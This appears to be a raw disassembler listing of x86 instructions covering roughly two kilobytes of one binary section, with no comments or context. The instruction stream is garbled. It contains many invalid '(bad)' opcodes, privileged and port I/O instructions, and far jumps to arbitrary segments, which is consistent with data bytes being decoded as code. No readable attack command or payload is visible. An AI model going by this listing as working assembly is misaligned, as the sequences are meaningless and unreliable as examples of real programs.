  417e90:	or     BYTE PTR [edi+0x17],ch
  417e93:	retf   0xf0ba
  417e96:	pop    eax
  417e97:	dec    edi
  417e98:	aad    0x3f
  417e9a:	inc    esp
  417e9b:	call   0x65332c43
  417ea0:	ds in  al,dx
  417ea2:	jnp    0x417e6c
  417ea4:	adc    edi,ebp
  417ea6:	pusha  
  417ea7:	imul   edx,DWORD PTR [esp+esi*4-0x3e627242],0xa4df2f2f
  417eb2:	out    dx,al
  417eb3:	dec    eax
  417eb4:	jmp    0x417eba
  417eb6:	pop    ss
  417eb7:	mov    eax,0x2df8a139
  417ebc:	xor    eax,0x76012bb4
  417ec1:	mov    esp,0x393801c9
  417ec6:	mov    edx,0xccb1df10
  417ecb:	hlt    
  417ecc:	retf   
  417ecd:	aas    
  417ece:	mov    ah,0xa4
  417ed0:	mov    esi,0xb24ae33
  417ed5:	test   eax,0xf4fbc860
  417eda:	mov    dh,0x41
  417edc:	cmp    al,0xb3
  417ede:	ret    0x636d
  417ee1:	adc    al,0xab
  417ee3:	test   eax,0xa0a11ca3
  417ee8:	mov    bh,0x93
  417eea:	adc    DWORD PTR [ebp-0x3c255538],0x88cccb11
  417ef4:	or     BYTE PTR [esi+0x4b],bh
  417ef7:	arpl   WORD PTR ds:0xc331923,dx
  417efd:	pop    ecx
  417efe:	jmp    FWORD PTR [ecx]
  417f00:	and    DWORD PTR [edx+0x8],esp
  417f03:	bound  edx,QWORD PTR [ebx]
  417f05:	jno    0x417e99
  417f07:	les    ecx,FWORD PTR [esi]
  417f09:	mov    ds:0x368fa5d,eax
  417f0e:	or     edx,DWORD PTR [esi-0x38]
  417f11:	and    BYTE PTR [edi+0x2d2d04],ah
  417f17:	xchg   ecx,eax
  417f18:	sbb    bl,cl
  417f1a:	sar    BYTE PTR [esi-0x2076b36f],0xe7
  417f21:	into   
  417f22:	fist   WORD PTR [esi-0x33]
  417f25:	(bad)  
  417f26:	test   DWORD PTR [esi+0x72b277b4],esp
  417f2c:	mov    eax,0xc64b9c93
  417f31:	cdq    
  417f32:	or     al,0x9a
  417f34:	or     eax,esi
  417f36:	and    al,0x47
  417f38:	and    al,0x9
  417f3a:	cs aas 
  417f3c:	retf   
  417f3d:	loop   0x417f57
  417f3f:	icebp  
  417f40:	arpl   WORD PTR [ecx],sp
  417f42:	mov    eax,ds:0x4ced08d7
  417f47:	es dec esp
  417f49:	or     esi,DWORD PTR [esi]
  417f4b:	out    dx,al
  417f4c:	inc    edi
  417f4d:	and    eax,ecx
  417f4f:	std    
  417f50:	mov    BYTE PTR [edi-0x4f13255a],cl
  417f56:	into   
  417f57:	shl    DWORD PTR [esi+0x65a43b34],1
  417f5d:	mov    ch,0x86
  417f5f:	mov    WORD PTR [edi],ds
  417f61:	dec    ecx
  417f62:	test   eax,0x145820d4
  417f67:	mov    BYTE PTR [edi-0x7c],0x14
  417f6b:	pop    eax
  417f6c:	push   cs
  417f6d:	or     cl,bh
  417f6f:	mov    WORD PTR [ebx+eiz*8-0x648c18b4],cs
  417f76:	adc    DWORD PTR [edx+0x73],0xffffffc9
  417f7a:	aam    0x5e
  417f7c:	sti    
  417f7d:	imul   ebx
  417f7f:	inc    edx
  417f80:	fwait
  417f81:	and    cl,bh
  417f83:	sbb    cl,BYTE PTR [esi-0x1c]
  417f86:	pop    esi
  417f87:	sbb    ebp,DWORD PTR [edi+eiz*8+0x2a124674]
  417f8e:	sbb    edi,DWORD PTR [edi-0x75d3f8e]
  417f94:	sbb    BYTE PTR [edx+edi*4-0x386e7525],dl
  417f9b:	and    cl,BYTE PTR [ebx+0x39]
  417f9e:	nop
  417f9f:	jmp    0x417f4f
  417fa1:	inc    esi
  417fa2:	cmc    
  417fa3:	test   eax,0x74640b54
  417fa8:	add    edi,edi
  417faa:	mov    ebx,0x3f69c3fd
  417faf:	dec    edi
  417fb0:	ror    esi,1
  417fb2:	sub    esi,DWORD PTR [edi]
  417fb4:	push   ebp
  417fb5:	(bad)
  417fb8:	cmp    eax,0xe57858c3
  417fbd:	(bad)  
  417fbe:	pop    ebp
  417fbf:	rol    ch,cl
  417fc1:	bound  edx,QWORD PTR cs:[eax-0x7c2b9ece]
  417fc8:	pop    edx
  417fc9:	mov    bh,0x2d
  417fcb:	and    al,0xee
  417fcd:	sbb    DWORD PTR [eax-0x64f50758],ecx
  417fd3:	ror    BYTE PTR [ebp-0x7a],cl
  417fd6:	push   edi
  417fd7:	dec    esi
  417fd8:	loop   0x417f7d
  417fda:	ret    0x3f80
  417fdd:	add    DWORD PTR [ebx-0x38],ebp
  417fe0:	push   0x9d917fa3
  417fe5:	push   0xffffffe5
  417fe7:	pop    edi
  417fe8:	adc    dl,cl
  417fea:	int3   
  417feb:	mov    dl,0xe3
  417fed:	mov    esi,0x5223badc
  417ff2:	cmp    edi,0x2a
  417ff5:	dec    esp
  417ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ff7:	add    al,0x61
  417ff9:	ret    
  417ffa:	pop    es
  417ffb:	sbb    bh,BYTE PTR [edi+ecx*2+0x3e912356]
  418002:	xor    edx,DWORD PTR [ebx+ecx*2+0x6]
  418006:	test   BYTE PTR [esi-0x6eb66e61],dh
  41800c:	inc    edx
  41800d:	(bad)  
  41800e:	test   ch,cl
  418010:	sbb    BYTE PTR [ebp+0xf614877],dh
  418016:	jns    0x41805d
  418018:	(bad)  
  418019:	stc    
  41801a:	sub    al,0x9b
  41801c:	xchg   esi,eax
  41801d:	xlat   BYTE PTR ds:[ebx]
  41801e:	or     bl,BYTE PTR [ebp-0x63ee41f8]
  418024:	mov    eax,0xc808c881
  418029:	ret    0xfc95
  41802c:	and    edi,DWORD PTR [esi-0x73]
  41802f:	push   esi
  418030:	inc    esp
  418031:	cwde   
  418032:	stc    
  418033:	mov    eax,0x6ca5e4a3
  418038:	jl     0x41804e
  41803a:	push   ds
  41803b:	mov    BYTE PTR [eax],dl
  41803d:	hlt    
  41803e:	clc    
  41803f:	mov    esi,0xe45550f
  418044:	(bad)  
  418045:	pop    ebx
  418046:	jp     0x417ff1
  418048:	into   
  418049:	mov    eax,ds:0x30b5c9b0
  41804e:	or     dh,bl
  418050:	cmp    DWORD PTR [ebx+0x56],ecx
  418053:	fs push ebx
  418055:	or     DWORD PTR [ecx+0xadb4678],0x610cc96e
  41805f:	jne    0x418054
  418061:	fstp   TBYTE PTR [ebx]
  418063:	push   ecx
  418064:	add    DWORD PTR [ebx-0x55],0x61671997
  41806b:	sbb    DWORD PTR ds:0xf2c22de1,esp
  418071:	or     al,0xef
  418073:	imul   edi,DWORD PTR [ebp-0x1],0x2f67ee56
  41807a:	ficomp DWORD PTR [esi-0x15]
  41807d:	(bad)  
  41807e:	aas    
  41807f:	inc    ecx
  418080:	clc    
  418081:	cmc    
  418082:	sbb    eax,edx
  418084:	jecxz  0x4180cb
  418086:	in     al,dx
  418087:	js     0x418061
  418089:	mov    al,0xd4
  41808b:	mov    ch,0xc4
  41808d:	rcr    BYTE PTR [edx-0x201e8c80],0xc
  418094:	fimul  WORD PTR [eax+0x37]
  418097:	push   0x93ade43
  41809c:	iret   
  41809d:	dec    ebx
  41809e:	popa   
  41809f:	out    0xf1,al
  4180a1:	xchg   esp,eax
  4180a2:	int    0xad
  4180a4:	gs call 0x6038:0xab2015b1
  4180ac:	inc    esp
  4180ad:	bound  ebx,QWORD PTR [ecx-0x7e5285db]
  4180b3:	jg     0x418070
  4180b5:	cld    
  4180b6:	or     DWORD PTR [eax+0xfcb2590],ebp
  4180bc:	jbe    0x418059
  4180be:	sbb    al,cl
  4180c0:	xor    ch,BYTE PTR [ecx+0x2f]
  4180c3:	fisttp DWORD PTR [ebp-0x2cd44d05]
  4180c9:	outs   dx,DWORD PTR ds:[esi]
  4180ca:	mov    eax,ds:0xeb5c6bb9
  4180cf:	sbb    edx,DWORD PTR ds:0x5ef627bf
  4180d5:	mov    esi,0xc17ac55d
  4180da:	syscall 
  4180dc:	mov    bh,0x2e
  4180de:	push   eax
  4180df:	jmp    0x418067
  4180e1:	mov    DWORD PTR [esi],ecx
  4180e3:	call   0x1b0d:0xf973f54a
  4180ea:	fwait
  4180eb:	adc    DWORD PTR [ebx],ebp
  4180ed:	test   eax,0xc7d4cb36
  4180f2:	mov    dh,0xd4
  4180f4:	add    dl,dl
  4180f6:	mov    es,WORD PTR [edx]
  4180f8:	dec    DWORD PTR [edi-0xdcc832]
  4180fe:	xor    BYTE PTR [edi+0x740b8060],ch
  418104:	aaa    
  418105:	dec    eax
  418106:	mov    ds:0x3116865f,al
  41810b:	or     al,BYTE PTR [eax+0x76850e0c]
  418111:	or     BYTE PTR [edi-0x5182e8ae],0xb
  418118:	rcr    BYTE PTR [ebp+eiz*1+0x16],0x73
  41811d:	ficomp DWORD PTR [edx-0x2e]
  418120:	push   0x811bb6c7
  418125:	aad    0x3
  418127:	and    dh,dl
  418129:	jge    0x4180fd
  41812b:	push   0x1ca0eaf6
  418130:	pop    ecx
  418131:	inc    ebx
  418132:	jmp    0x418181
  418134:	cmp    BYTE PTR [edx],bh
  418136:	lahf   
  418137:	or     eax,0x5650e8c1
  41813c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41813d:	and    edx,DWORD PTR [esi]
  41813f:	cmp    ah,BYTE PTR [ecx+0x6febd89]
  418145:	xor    BYTE PTR [eax+ebx*2],bh
  418148:	das    
  418149:	or     BYTE PTR [eax],cl
  41814b:	rcr    esi,0x60
  41814e:	std    
  41814f:	dec    edi
  418150:	shr    BYTE PTR [esi+edx*2-0x13],1
  418154:	mov    ch,BYTE PTR [edi]
  418156:	cmc    
  418157:	ror    DWORD PTR [edx+0x13683598],1
  41815d:	mov    ch,BYTE PTR [ebx]
  41815f:	retf   
  418160:	xor    eax,0x4021b0d5
  418165:	addr16 push cs
  418167:	shl    DWORD PTR es:[ebx+0x61],0xed
  41816c:	and    al,0xf6
  41816e:	mov    ds:0x33aaeaa3,al
  418173:	xchg   ebp,eax
  418174:	push   ebx
  418175:	push   cs
  418176:	loope  0x418120
  418178:	retf   0xe4e2
  41817b:	dec    edx
  41817c:	push   es
  41817d:	sub    esi,DWORD PTR [edi]
  41817f:	and    al,0x29
  418181:	fcom   DWORD PTR [ecx+0xa81112a]
  418187:	mov    al,BYTE PTR [ebp+0x45]
  41818a:	test   eax,0x1643db24
  41818f:	ret    
  418190:	enter  0x2ce3,0xf6
  418194:	xchg   edi,eax
  418195:	push   0xffffffa0
  418197:	mov    edi,DWORD PTR [edx-0x65187c14]
  41819d:	cmp    al,0x47
  41819f:	dec    eax
  4181a0:	jle    0x4181c1
  4181a2:	push   es
  4181a3:	adc    ch,cl
  4181a5:	jecxz  0x41817e
  4181a7:	adc    dl,BYTE PTR [esi+0x39]
  4181aa:	xor    al,0x6e
  4181ac:	add    al,BYTE PTR [edx-0xc926ca8]
  4181b2:	cli    
  4181b3:	fisub  WORD PTR [esi+eax*4+0x6]
  4181b7:	mov    al,ds:0xa32c8f02
  4181bc:	repnz mov al,0xd7
  4181bf:	inc    esi
  4181c0:	adc    BYTE PTR [edx],ch
  4181c2:	fstp   QWORD PTR [ebx+ebp*2]
  4181c5:	sbb    BYTE PTR [ebp-0x6e],bh
  4181c8:	cld    
  4181c9:	(bad)  
  4181ca:	int    0x9a
  4181cc:	aas    
  4181cd:	in     al,dx
  4181ce:	mov    ebx,0x89cd59dc
  4181d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181d4:	fld    DWORD PTR [ecx-0x58]
  4181d7:	and    DWORD PTR [edx-0x4],ebx
  4181da:	pop    eax
  4181db:	xchg   esp,eax
  4181dc:	mov    ds:0xb0d7659b,al
  4181e1:	jmp    0x3690:0x1ad5fc44
  4181e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e9:	adc    ah,BYTE PTR [ecx+edi*8]
  4181ec:	add    DWORD PTR [esi-0x214b40fd],esp
  4181f2:	cmp    dl,dh
  4181f4:	loop   0x418235
  4181f6:	push   ss
  4181f7:	int3   
  4181f8:	cmp    DWORD PTR [ecx],ecx
  4181fa:	sahf   
  4181fb:	out    0x93,al
  4181fd:	pop    ds
  4181fe:	inc    ebx
  4181ff:	idiv   BYTE PTR [ecx-0xe]
  418202:	cld    
  418203:	test   ecx,edx
  418205:	xlat   BYTE PTR es:[ebx]
  418207:	outs   dx,BYTE PTR ds:[esi]
  418208:	mov    ?,WORD PTR [ebx]
  41820a:	retf   
  41820b:	inc    edx
  41820c:	scas   al,BYTE PTR es:[edi]
  41820d:	or     eax,0xf181984e
  418212:	or     BYTE PTR [ebx],al
  418214:	push   ebx
  418215:	icebp  
  418216:	sbb    DWORD PTR ds:0x2ee102fe,esp
  41821c:	or     BYTE PTR [ecx+edi*1],ch
  41821f:	inc    edx
  418220:	je     0x41820f
  418222:	xor    DWORD PTR [ebp+eiz*2+0x2dd7a930],eax
  418229:	sub    al,0xb6
  41822b:	arpl   WORD PTR [esi-0x67],cx
  41822e:	or     BYTE PTR [edx-0x7a97f23c],ah
  418234:	pop    ebp
  418235:	ins    BYTE PTR es:[edi],dx
  418236:	int    0x97
  418238:	adc    BYTE PTR [esi],bh
  41823a:	push   0xffffff86
  41823c:	add    al,0x12
  41823e:	cmp    cl,bh
  418240:	ficomp WORD PTR cs:[eax+0x2b]
  418245:	pop    eax
  418246:	adc    eax,0xf7aeebd7
  41824b:	xchg   esi,eax
  41824c:	mov    ch,0x9c
  41824e:	push   0x32
  418250:	pop    ebp
  418251:	jo     0x418231
  418253:	fadd   DWORD PTR [ebp+0x5ed90482]
  418259:	and    ebx,ecx
  41825b:	pop    esp
  41825c:	mov    edi,0xd12eb2c2
  418261:	dec    esp
  418262:	xchg   esp,eax
  418263:	add    esi,esp
  418265:	(bad)  
  418266:	fst    QWORD PTR [edx+0x3ed9d3e]
  41826c:	lea    edi,[eax]
  41826e:	inc    ebp
  41826f:	jno    0x418220
  418271:	dec    eax
  418272:	mov    BYTE PTR [ebp*1-0x307a4a4],dh
  418279:	mov    esp,0x69ff35e3
  41827e:	sbb    al,0x97
  418280:	dec    edi
  418281:	jmp    0x418217
  418283:	sub    DWORD PTR [eax],ecx
  418285:	jg     0x41829c
  418287:	xchg   BYTE PTR [ecx+ecx*4+0x20],ah
  41828b:	or     DWORD PTR [eax-0x5579e731],ebp
  418291:	lea    eax,[ebx-0x1c]
  418294:	inc    DWORD PTR [eax]
  418296:	in     eax,dx
  418297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418298:	fmulp  st(2),st
  41829a:	loopne 0x41823e
  41829c:	jmp    0x41831c
  41829e:	xor    al,0x12
  4182a0:	test   BYTE PTR [ebx+0xd],0x68
  4182a4:	cmp    al,0x46
  4182a6:	cld    
  4182a7:	mov    ebx,0xb8ee6fd7
  4182ac:	pushf  
  4182ad:	dec    eax
  4182ae:	sahf   
  4182af:	mov    DWORD PTR [eax+0x12],esi
  4182b2:	lock sub eax,0xb6d8a9aa
  4182b8:	sbb    BYTE PTR [eax+0xf],dh
  4182bb:	push   ebp
  4182bc:	and    DWORD PTR [ebp-0x24],0x568cc487
  4182c3:	and    BYTE PTR [ebx+0x9],cl
  4182c6:	or     dl,ch
  4182c8:	ja     0x4182d8
  4182ca:	add    al,0xe2
  4182cc:	sub    cl,bl
  4182ce:	or     eax,0x44979731
  4182d3:	repnz push DWORD PTR [ecx+0x7]
  4182d7:	mov    ds:0x54c8c12a,eax
  4182dc:	sar    BYTE PTR [esi+0x2f],0x72
  4182e0:	sbb    DWORD PTR [eax-0x3c94fbb0],0xd87f645f
  4182ea:	xor    edi,DWORD PTR [edi-0x8]
  4182ed:	(bad)  
  4182ee:	mov    esp,0x194cf574
  4182f3:	gs scas al,BYTE PTR es:[edi]
  4182f5:	or     esp,esi
  4182f7:	js     0x4182ea
  4182f9:	jo     0x41829a
  4182fb:	inc    ebx
  4182fc:	imul   esp,DWORD PTR [ebx+0x5c],0x6658d529
  418303:	nop
  418304:	mov    ecx,0x626fc8fe
  418309:	and    bh,BYTE PTR [esp+edi*1-0x7d]
  41830d:	retf   
  41830e:	js     0x41832c
  418310:	jge    0x418340
  418312:	xchg   esi,eax
  418313:	pop    esi
  418314:	cmc    
  418315:	mov    dh,0xa
  418317:	fsub   DWORD PTR ds:0x45c4
  41831c:	push   ss
  41831d:	sar    dl,1
  41831f:	sbb    DWORD PTR ss:[ebx+edi*8+0x2f9f6791],0x7c
  418328:	mov    bh,0xed
  41832a:	test   esp,0x62d264ca
  418330:	das    
  418331:	push   ecx
  418332:	cmp    al,ah
  418334:	or     edi,eax
  418336:	shl    dl,1
  418338:	repnz loopne 0x4182f5
  41833b:	nop
  41833c:	sub    BYTE PTR [edx+0x5960cdc2],bh
  418342:	xor    dh,BYTE PTR [eax-0x2f]
  418345:	das    
  418346:	ret    
  418347:	dec    eax
  418348:	cwde   
  418349:	sub    DWORD PTR gs:[ebx],esi
  41834c:	mov    esi,0x284a9dd3
  418351:	jl     0x4183a5
  418353:	sbb    al,bh
  418355:	xchg   ebx,eax
  418356:	push   ds
  418357:	pusha  
  418358:	jg     0x418373
  41835a:	cwde   
  41835b:	jmp    0x6e23:0xca376307
  418362:	jmp    0xf551:0xbdbc5f81
  418369:	or     al,BYTE PTR [edx+eax*8]
  41836c:	aam    0x5a
  41836e:	into   
  41836f:	cmp    BYTE PTR [ecx],ch
  418371:	sub    bh,bh
  418373:	add    ecx,eax
  418375:	sub    DWORD PTR [edx+ebp*1-0x70],0xffffffec
  41837a:	or     al,0x82
  41837c:	pop    edx
  41837d:	ret    0xa843
  418380:	lods   eax,DWORD PTR ds:[esi]
  418381:	xor    BYTE PTR [eax+ebp*1],al
  418384:	jge    0x4183cb
  418386:	hlt    
  418387:	or     edi,DWORD PTR ds:0xc410c336
  41838d:	pop    ecx
  41838e:	sub    ebx,ebp
  418390:	sahf   
  418391:	je     0x41835b
  418393:	mov    eax,ds:0x987f5bee
  418398:	test   DWORD PTR [eax],esi
  41839a:	sub    DWORD PTR [ecx-0x10],esp
  41839d:	sub    eax,0x76bb2e91
  4183a2:	cs mov edi,0x3598a944
  4183a8:	push   edi
  4183a9:	inc    edi
  4183aa:	jge    0x41836a
  4183ac:	xchg   esi,eax
  4183ad:	mov    edx,0x7381d7ec
  4183b2:	jge    0x418368
  4183b4:	pop    ss
  4183b5:	xchg   DWORD PTR [ebx+0x4c],esi
  4183b8:	popf   
  4183b9:	imul   ebp,DWORD PTR [ecx],0x18
  4183bc:	int    0x6d
  4183be:	push   edi
  4183bf:	je     0x4183ce
  4183c1:	lahf   
  4183c2:	push   eax
  4183c3:	packuswb mm2,QWORD PTR [esi-0x3505cc73]
  4183ca:	aas    
  4183cb:	jmp    0xc5d3de35
  4183d0:	mov    esp,?
  4183d2:	dec    esp
  4183d3:	mov    bl,0xf8
  4183d5:	out    0x55,al
  4183d7:	fldenv [edx]
  4183d9:	(bad)  
  4183da:	in     al,dx
  4183db:	push   cs
  4183dc:	add    ah,ch
  4183de:	les    esi,FWORD PTR [edi+0x18dfc86b]
  4183e4:	pop    ebx
  4183e5:	test   eax,0x2c8a664d
  4183ea:	retf   
  4183eb:	scas   al,BYTE PTR es:[edi]
  4183ec:	cld    
  4183ed:	sahf   
  4183ee:	fs repnz adc eax,edi
  4183f2:	xor    al,0x6b
  4183f4:	xchg   esp,eax
  4183f5:	push   ebp
  4183f6:	enter  0x5cf8,0x7d
  4183fa:	es aad 0x4b
  4183fd:	fistp  DWORD PTR [edi+edx*8]
  418400:	cwde   
  418401:	aaa    
  418402:	cmc    
  418403:	mov    eax,ds:0xd118a04b
  418408:	shr    DWORD PTR [eax-0x321d6d6c],cl
  41840e:	aas    
  41840f:	inc    ebp
  418410:	sub    BYTE PTR [esi],bl
  418412:	stos   BYTE PTR es:[edi],al
  418413:	js     0x418433
  418415:	pop    ss
  418416:	sub    eax,0x7d19367e
  41841b:	xchg   DWORD PTR [edx+0x6ed1a1c1],ebp
  418421:	inc    eax
  418422:	test   eax,0xcd0c8675
  418427:	lea    esi,[eax-0x5141c417]
  41842d:	add    DWORD PTR [ebx-0x64],eax
  418430:	sar    BYTE PTR [edx+0x5000fb42],1
  418436:	(bad)  
  418437:	retf   0x6c56
  41843a:	(bad)  [edi]
  41843c:	jb     0x418457
  41843e:	jbe    0x418409
  418440:	jmp    0x87bfd503
  418445:	mov    cl,0xc5
  418447:	mov    al,0x46
  418449:	pop    esi
  41844a:	xchg   ebp,ebx
  41844c:	jmp    0x4184bc
  41844e:	retf   0xf34c
  418451:	nop
  418452:	rcr    DWORD PTR [edi-0x3b6d02b3],1
  418458:	jbe    0x418426
  41845a:	loop   0x418446
  41845c:	shrd   DWORD PTR [edx-0x5],esp,0x25
  418461:	or     al,0x39
  418463:	mov    al,ds:0x94267c11
  418468:	addr16 sub al,0xa9
  41846b:	sub    edx,DWORD PTR ds:0xc1a3cee5
  418471:	mov    ch,0x1c
  418473:	mov    ch,0xda
  418475:	add    ebx,DWORD PTR [esi+eax*8-0x2bbca89a]
  41847c:	je     0x41841d
  41847e:	test   DWORD PTR [ebp+0x6e],ecx
  418481:	and    BYTE PTR [edi-0x56c367e],dh
  418487:	mov    al,0x37
  418489:	ficom  WORD PTR [esi-0x61]
  41848c:	out    dx,eax
  41848d:	cmp    eax,0xc9c0dc93
  418492:	xchg   ebp,eax
  418493:	repnz into 
  418495:	push   esp
  418496:	push   ebx
  418497:	enter  0xce2f,0xcb
  41849b:	fisub  WORD PTR [eax]
  41849d:	cmp    bh,al
  41849f:	jp     0x418508
  4184a1:	pop    eax
  4184a2:	(bad)  
  4184a3:	gs dec ebp
  4184a5:	cmc    
  4184a6:	inc    esp
  4184a7:	loope  0x418485
  4184a9:	stos   BYTE PTR es:[edi],al
  4184aa:	mov    DWORD PTR [ebx+eax*8-0x97c7113],esp
  4184b1:	push   ebp
  4184b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b3:	hlt    
  4184b4:	or     dh,al
  4184b6:	adc    esi,DWORD PTR [ebx]
  4184b8:	pop    esp
  4184b9:	fcmove st,st(2)
  4184bb:	mov    bh,0x4d
  4184bd:	and    dl,dl
  4184bf:	and    dh,dl
  4184c1:	outs   dx,DWORD PTR ds:[esi]
  4184c2:	or     ebx,DWORD PTR ss:[edx+0x7015e8f3]
  4184c9:	aas    
  4184ca:	dec    eax
  4184cb:	shl    BYTE PTR [edi],cl
  4184cd:	retf   0x979e
  4184d0:	das    
  4184d1:	dec    BYTE PTR [ebp+0x71302dc0]
  4184d7:	or     esp,DWORD PTR [edx-0x62b1221b]
  4184dd:	repnz cmp DWORD PTR [edi],esi
  4184e0:	cmp    ah,dl
  4184e2:	popf   
  4184e3:	add    al,0xa9
  4184e5:	imul   eax,ebp,0x8ccf487b
  4184eb:	test   eax,0xfb8b4d52
  4184f0:	(bad)  
  4184f2:	xchg   bx,ax
  4184f4:	adc    DWORD PTR [esi-0x6cff11ee],0x33
  4184fb:	adc    DWORD PTR [esi+0x86e3039],eax
  418501:	inc    esp
  418502:	cmp    esp,DWORD PTR [ebx+0x3e470c2e]
  418508:	cwde   
  418509:	xchg   ecx,eax
  41850a:	mov    ds:0xfb9f944a,al
  41850f:	inc    eax
  418510:	inc    ebx
  418511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418512:	mov    BYTE PTR [ecx+0x49f56fe3],bh
  418518:	stos   BYTE PTR es:[edi],al
  418519:	mov    edi,0x9702f5ef
  41851e:	retf   
  41851f:	ins    BYTE PTR es:[edi],dx
  418520:	mov    ah,0x40
  418522:	sbb    eax,edx
  418524:	ins    BYTE PTR es:[edi],dx
  418525:	in     eax,0xe6
  418527:	dec    ebx
  418528:	out    0xa0,al
  41852a:	mov    dl,0xf2
  41852c:	stos   BYTE PTR es:[edi],al
  41852d:	jmp    0x7436:0x700fa853
  418534:	enter  0xe3a,0xfe
  418538:	out    dx,eax
  418539:	dec    eax
  41853a:	mov    ah,0x19
  41853c:	rol    DWORD PTR [ebx],cl
  41853e:	add    DWORD PTR [esi-0x44],ecx
  418541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418542:	pop    edi
  418543:	or     bl,0x52
  418546:	sub    al,cl
  418548:	sbb    ah,ch
  41854a:	xchg   ecx,eax
  41854b:	sahf   
  41854c:	in     eax,0xb4
  41854e:	dec    BYTE PTR [eax+esi*2-0x4060d22b]
  418555:	pop    esp
  418557:	xchg   esi,eax
  418558:	cmp    bh,dh
  41855a:	push   ebx
  41855b:	xchg   esi,edi
  41855d:	jnp    0x418544
  41855f:	xor    BYTE PTR [ebp+0x186b894c],bh
  418565:	xchg   ebx,eax
  418566:	cmp    al,0x5c
  418568:	das    
  418569:	xor    ah,dh
  41856b:	add    ecx,DWORD PTR [edi-0x2460c429]
  418571:	int    0x94
  418573:	add    eax,0x66d448b4
  418578:	mov    BYTE PTR [ecx+0x4f],ah
  41857b:	pop    ebp
  41857c:	sub    BYTE PTR [esi+0x2200818f],0x2c
  418583:	push   ecx
  418584:	xor    DWORD PTR [esi],0x76c2a712
  41858a:	enter  0x89ed,0xb5
  41858e:	dec    esp
  41858f:	ss sbb edi,esp
  418592:	dec    ebp
  418593:	addr16 je 0x418541
  418596:	sub    edi,DWORD PTR [ebp+ebx*4+0x4]
  41859a:	scas   eax,DWORD PTR es:[edi]
  41859b:	ds scas eax,DWORD PTR es:[edi]
  41859d:	jae    0x418602
  41859f:	lds    ecx,FWORD PTR [edi-0x198cbf13]
  4185a5:	xchg   ebx,eax
  4185a6:	leave  
  4185a7:	mov    ebp,0x2fffc31b
  4185ac:	xchg   esi,edi
  4185ae:	popa   
  4185af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185b0:	sbb    al,BYTE PTR [edi-0x3e]
  4185b3:	xchg   ecx,eax
  4185b4:	xor    BYTE PTR [edx],0x89
  4185b7:	mov    esi,DWORD PTR [ebx-0x6cc38c1d]
  4185bd:	adc    eax,0x16bf013
  4185c2:	ds cs scas eax,DWORD PTR es:[edi]
  4185c5:	sbb    bh,BYTE PTR [edx]
  4185c7:	ja     0x418623
  4185c9:	shr    DWORD PTR [ebp+0x70839809],cl
  4185cf:	sub    eax,esi
  4185d1:	std    
  4185d2:	mov    WORD PTR [edx],fs
  4185d4:	in     al,dx
  4185d5:	icebp  
  4185d6:	stc    
  4185d7:	xor    ebp,esi
  4185d9:	fwait
  4185da:	mov    ecx,0xed0ff931
  4185df:	cld    
  4185e0:	leave  
  4185e1:	ds pop ebp
  4185e3:	in     al,0x65
  4185e5:	int3   
  4185e6:	xor    eax,0xcca6ba22
  4185eb:	sbb    eax,0xd3638b3e
  4185f0:	(bad)  
  4185f1:	retf   0x41b7
  4185f4:	jmp    0x4185d8
  4185f6:	push   eax
  4185f7:	inc    edx
  4185f8:	lahf   
  4185f9:	sbb    DWORD PTR [edx],esp
  4185fb:	imul   ebp,esp,0xfe5c8755
  418601:	scas   eax,DWORD PTR es:[edi]
  418602:	loope  0x4185fc
  418604:	jle    0x4185ec
  418606:	cmp    DWORD PTR [eax],0x9
  418609:	in     eax,0x31
  41860b:	mov    ah,0xc2
  41860d:	push   ebp
  41860e:	dec    esi
  41860f:	cmp    esi,ecx
  418611:	push   esp
  418612:	out    dx,al
  418613:	imul   esi,DWORD PTR [ebx],0xd8c7e743
  418619:	jle    0x4185c8
  41861b:	push   ecx
  41861c:	in     eax,0xc
  41861e:	or     al,0x1
  418620:	jge    0x4185c7
  418622:	xor    al,0xa8
  418624:	lods   al,BYTE PTR ds:[esi]
  418625:	outs   dx,DWORD PTR ds:[esi]
  418626:	dec    ecx
  418627:	sub    ebx,esi
  418629:	add    edx,eax
  41862b:	cld    
  41862c:	rcr    BYTE PTR [esi+0x43],1
  41862f:	hlt    
  418630:	ds jbe 0x4185f1
  418633:	jle    0x4185f7
  418635:	add    cl,ch
  418637:	jnp    0x4186a6
  418639:	vpsubsb xmm1,xmm4,XMMWORD PTR [edi+0x29f3889a]
  418641:	sub    eax,0x9d242f64
  418646:	inc    edi
  418647:	pop    eax
  418648:	inc    esp
  418649:	pusha  
  41864a:	add    al,0xd8
  41864c:	cs xchg esp,eax
  41864e:	mov    eax,0xe85a2814
  418653:	fscale 
  418655:	retf   0x7d2c
  418658:	inc    ecx
  418659:	nop
  41865a:	push   edi
  41865b:	fisttp WORD PTR [ebx]
  41865d:	popf   
  41865e:	mov    edx,0xa43a68f9
  418663:	xor    eax,0x66e6d3
  418668:	dec    edx
  418669:	in     eax,0x9
  41866b:	dec    eax
  41866c:	aam    0xef
  41866e:	outs   dx,BYTE PTR ds:[esi]
  41866f:	int3   
  418670:	mov    al,ds:0xfd248491
  418675:	aaa    
  418676:	arpl   WORD PTR [esi],bp
  418678:	inc    esp
  418679:	jg     0x4186a4
  41867b:	sbb    ecx,DWORD PTR [ebx-0x40]
  41867e:	mov    ebp,0x90a51a03
  418683:	(bad)  
  418684:	pop    ss
  418685:	test   eax,0xac8cc994
  41868a:	add    eax,0xd0a71264
  41868f:	mov    al,0x91
  418691:	cs dec edx
  418693:	mov    ds:0x23d109e4,al
  418698:	inc    ecx
  418699:	pushf  
  41869a:	xor    BYTE PTR [eax+0x28e2c51c],0x57
  4186a1:	or     esp,DWORD PTR [ecx]
  4186a3:	jne    0x418665
  4186a5:	inc    ecx
  4186a6:	(bad)  
  4186a7:	mov    bh,0x8f
  4186a9:	call   0x9cfc4bba
  4186ae:	mov    edx,0x8aad13e6
  4186b3:	fisttp QWORD PTR [edi]
  4186b5:	stc    
  4186b6:	pop    eax
  4186b7:	ins    DWORD PTR es:[edi],dx
  4186b8:	adc    al,0x5b
  4186ba:	mov    ds:0x8e8732e8,eax
  4186bf:	and    bh,dh
